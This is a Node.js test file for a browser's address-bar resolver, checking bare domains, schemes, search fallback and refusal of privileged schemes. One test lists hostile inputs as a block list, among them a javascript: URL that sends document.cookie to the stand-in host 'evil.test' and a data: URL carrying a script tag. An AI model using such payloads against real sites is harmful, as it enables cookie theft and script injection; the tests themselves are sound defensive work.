'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');

const { resolveInput, prettyUrl } = require('../src/main/urls');

const SEARCH = 'https://duckduckgo.com/?q=%s';
const resolve = (input) => resolveInput(input, SEARCH);

test('a bare domain becomes an https address', () => {
  assert.equal(resolve('example.com'), 'https://example.com');
  assert.equal(resolve('example.com/path?a=b'), 'https://example.com/path?a=b');
  assert.equal(resolve('sub.example.co.uk'), 'https://sub.example.co.uk');
});

test('an explicit scheme is honoured', () => {
  assert.equal(resolve('http://example.com'), 'http://example.com');
  assert.equal(resolve('https://example.com'), 'https://example.com');
  assert.equal(resolve('umbra://settings'), 'umbra://settings');
  assert.equal(resolve('file:///tmp/x.html'), 'file:///tmp/x.html');
});

test('localhost and bare IPs go over http', () => {
  assert.equal(resolve('localhost:3000'), 'http://localhost:3000');
  assert.equal(resolve('127.0.0.1:8080/x'), 'http://127.0.0.1:8080/x');
});

test('anything else becomes a search', () => {
  // A typo must never turn into a DNS lookup somebody can watch.
  assert.equal(resolve('how do i exit vim'), 'https://duckduckgo.com/?q=how%20do%20i%20exit%20vim');
  assert.equal(resolve('example'), 'https://duckduckgo.com/?q=example');
  assert.equal(resolve('example.com and more words'), 'https://duckduckgo.com/?q=example.com%20and%20more%20words');
});

test('privileged schemes are refused outright, not searched for', () => {
  for (const attempt of [
    'chrome://net-export',
    'devtools://devtools/bundled/inspector.html',
    'chrome-extension://abc/page.html',
    'javascript:fetch("https://evil.test/"+document.cookie)',
    'vbscript:msgbox(1)',
    'chrome-untrusted://x',
    'data:text/html,<script>alert(1)</script>',
    'intent://scan/#Intent;scheme=zxing;end',
    'ms-msdt:something',
  ]) {
    assert.equal(resolve(attempt), null, attempt);
  }
});

test('unknown app schemes are searched, not handed to the OS', () => {
  assert.equal(
    resolve('slack://open'),
    'https://duckduckgo.com/?q=slack%3A%2F%2Fopen'
  );
});

test('empty input resolves to nothing', () => {
  assert.equal(resolve(''), null);
  assert.equal(resolve('   '), null);
  assert.equal(resolve(null), null);
});

test('the address bar hides https and keeps everything else', () => {
  assert.equal(prettyUrl('https://example.com/'), 'example.com');
  assert.equal(prettyUrl('https://example.com/a?b=c#d'), 'example.com/a?b=c#d');
  assert.equal(prettyUrl('http://example.com/'), 'http://example.com');
  assert.equal(prettyUrl('umbra://newtab'), '');
});
